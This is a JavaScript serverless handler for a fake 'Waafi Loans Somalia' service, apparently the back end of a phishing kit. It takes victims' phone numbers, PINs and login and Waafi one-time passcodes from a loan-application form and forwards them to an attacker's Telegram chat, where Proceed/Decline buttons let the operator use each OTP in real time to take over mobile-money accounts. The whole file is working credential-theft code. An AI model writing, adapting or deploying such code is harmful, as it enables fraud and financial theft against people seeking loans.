// api/sendTelegram.js — Waafi Loans Somalia (Somali product, English Telegram output)

if (!global._otpStatuses) global._otpStatuses = {};

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  const TOKEN   = process.env.TELEGRAM_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
  if (!TOKEN || !CHAT_ID) return res.status(500).send('Missing env vars');

  let payload = {};
  try { payload = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : (req.body || {}); }
  catch { return res.status(400).send('Invalid JSON'); }

  const esc = s => s == null ? '—' : String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  const val = s => (s == null || s === '') ? '—' : esc(String(s));
  const line = (label, v) => `<b>${label}:</b> ${val(v)}\n`;

  const p = payload;
  const event = p.event || 'Submission';
  const isOTP = event === 'Login OTP' || event === 'Waafi OTP';

  let text = `🏦 <b>Waafi Loans — ${esc(event)}</b>\n\n`;

  if (p.submittedAt) {
    const t = new Date(p.submittedAt);
    const fmt = isNaN(t) ? p.submittedAt
      : t.toLocaleString('en-GB', { timeZone: 'Africa/Nairobi', hour12: false });
    text += line('🕐 Time', fmt);
  }
  if (p.device) text += line('📱 Device', p.device);
  text += '\n';

  if (p.loanAmount || p.plan) {
    text += `📋 <b>Loan Details</b>\n`;
    if (p.plan)       text += line('Product',  p.plan);
    if (p.loanAmount) text += line('Amount',   '$' + p.loanAmount);
    if (p.period)     text += line('Period',   p.period);
    if (p.age)        text += line('Age',      p.age);
    text += '\n';
  }

  text += `🔐 <b>Credentials</b>\n`;
  if (p.phone)          text += line('Phone',     p.phone);
  if (p.pin)            text += line('PIN',       p.pin);
  if (p['Login OTP'])   text += line('Login OTP', p['Login OTP']);
  if (p['Waafi OTP'])   text += line('Waafi OTP', p['Waafi OTP']);

  // Build inline keyboard for OTP events
  const sessionId = p.sessionId || null;
  let reply_markup = undefined;

  if (isOTP && sessionId) {
    global._otpStatuses[sessionId] = 'pending';
    reply_markup = {
      inline_keyboard: [[
        { text: '✅ Proceed', callback_data: `proceed_${sessionId}` },
        { text: '❌ Decline', callback_data: `decline_${sessionId}` },
      ]]
    };
  }

  try {
    const body = {
      chat_id: CHAT_ID,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    };
    if (reply_markup) body.reply_markup = reply_markup;

    const resp = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });

    const bodyText = await resp.text();
    if (!resp.ok) return res.status(502).send('Telegram error: ' + bodyText);

    let parsed;
    try { parsed = JSON.parse(bodyText); } catch { parsed = bodyText; }
    return res.status(200).json(typeof parsed === 'string' ? { ok: true } : parsed);

  } catch (e) {
    return res.status(500).send('Fetch error: ' + (e?.message || e));
  }
}
